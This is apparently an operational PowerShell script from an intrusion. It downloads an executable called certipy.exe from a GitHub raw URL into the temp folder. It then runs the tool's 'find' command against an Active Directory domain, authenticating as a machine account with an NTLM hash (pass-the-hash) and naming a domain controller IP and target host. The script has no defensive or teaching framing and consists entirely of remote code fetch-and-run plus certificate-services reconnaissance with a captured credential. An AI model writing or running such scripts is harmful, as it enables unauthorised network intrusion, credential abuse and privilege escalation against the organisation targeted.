$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$tool = Join-Path $env:TEMP "certipy.exe"
$out = Join-Path $env:TEMP "certipy-eiv.txt"

(New-Object Net.WebClient).DownloadFile("$root/certipy.exe", $tool)
$args = @(
    "find",
    "-u", "IESVALLVERA\S-3$",
    "-hashes", ":cb147b77c1d775d659b4b7dcaa95567c",
    "-dc-ip", "192.168.0.205",
    "-target", "S-7.iesvallvera.lan"
)
$proc = Start-Process $tool -ArgumentList $args -Wait -PassThru `
    -RedirectStandardOutput $out -RedirectStandardError "$out.err"
Write-Output "CERTIPY_EXIT=$($proc.ExitCode)"
if (Test-Path $out) {
    Get-Content $out -Raw
}
if (Test-Path "$out.err") {
    Get-Content "$out.err" -Raw
}
